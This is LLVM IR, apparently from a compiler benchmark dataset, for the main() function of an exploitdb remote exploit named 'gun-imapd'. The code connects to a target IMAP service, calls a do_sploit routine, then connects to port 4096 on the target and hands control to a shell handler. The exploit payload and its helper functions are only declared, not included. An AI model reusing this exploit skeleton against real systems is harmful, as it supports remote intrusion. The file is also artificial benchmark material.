; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1038.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1038.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [35 x i8] c" . gun-imapd v0.1 by qobaiashi\0A |\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"p:t:h\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [20 x i8] c" |- using port: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" |- target host is: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c" |- remote host is a %s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [32 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 143, i32* %8, align 4
  store i8* null, i8** %9, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %12 = getelementptr inbounds [32 x i8], [32 x i8]* %10, i64 0, i64 0
  %13 = call i32 @memset(i8* %12, i32 0, i32 32)
  br label %14

14:                                               ; preds = %33, %2
  %15 = load i32, i32* %4, align 4
  %16 = load i8**, i8*** %5, align 8
  %17 = call i32 @getopt(i32 %15, i8** %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  store i32 %17, i32* %6, align 4
  %18 = load i32, i32* @EOF, align 4
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %34

20:                                               ; preds = %14
  %21 = load i32, i32* %6, align 4
  switch i32 %21, label %33 [
    i32 112, label %22
    i32 116, label %27
    i32 104, label %31
  ]

22:                                               ; preds = %20
  %23 = load i8*, i8** @optarg, align 8
  %24 = call i32 @atoi(i8* %23)
  store i32 %24, i32* %8, align 4
  %25 = load i32, i32* %8, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i32 %25)
  br label %33

27:                                               ; preds = %20
  %28 = load i8*, i8** @optarg, align 8
  store i8* %28, i8** %9, align 8
  %29 = load i8*, i8** @optarg, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i8* %29)
  br label %33

31:                                               ; preds = %20
  %32 = call i32 (...) @help()
  br label %33

33:                                               ; preds = %31, %20, %27, %22
  br label %14

34:                                               ; preds = %14
  %35 = load i8*, i8** %9, align 8
  %36 = icmp eq i8* %35, null
  br i1 %36, label %37, label %39

37:                                               ; preds = %34
  %38 = call i32 (...) @help()
  br label %39

39:                                               ; preds = %37, %34
  %40 = load i8*, i8** %9, align 8
  %41 = load i32, i32* %8, align 4
  %42 = call i32 @connectme(i8* %40, i32 %41)
  store i32 %42, i32* %7, align 4
  %43 = load i32, i32* %7, align 4
  %44 = getelementptr inbounds [32 x i8], [32 x i8]* %10, i64 0, i64 0
  %45 = call i32 @read(i32 %43, i8* %44, i32 32)
  %46 = icmp sgt i32 %45, -1
  br i1 %46, label %47, label %51

47:                                               ; preds = %39
  %48 = getelementptr inbounds [32 x i8], [32 x i8]* %10, i64 0, i64 0
  %49 = getelementptr inbounds i8, i8* %48, i64 4
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i8* %49)
  br label %51

51:                                               ; preds = %47, %39
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @do_sploit(i32 %52)
  %54 = call i32 @sleep(i32 1)
  %55 = load i8*, i8** %9, align 8
  %56 = call i32 @connectme(i8* %55, i32 4096)
  store i32 %56, i32* %6, align 4
  %57 = load i32, i32* %6, align 4
  %58 = call i32 @handleshell(i32 %57)
  %59 = load i32, i32* %6, align 4
  %60 = call i32 @close(i32 %59)
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  %63 = load i32, i32* %3, align 4
  ret i32 %63
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @help(...) #1

declare dso_local i32 @connectme(i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @do_sploit(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @handleshell(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
